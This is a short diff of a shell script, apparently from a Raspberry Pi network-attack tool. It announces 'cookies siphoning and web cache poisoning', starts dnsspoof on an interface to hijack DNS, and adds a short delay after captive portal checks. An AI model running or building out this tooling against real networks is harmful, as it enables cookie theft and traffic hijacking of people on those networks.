@@ -3,6 +3,8 @@
 echo '[*] running cookies siphoning and web cache poisoning'
 HOME='/home/pi/'
 
+sleep 5 # after captive portal checks
+
 [[ $(pgrep dnsspoof) = '' ]] && {
   dnsspoof -i "$1" port 53
 }
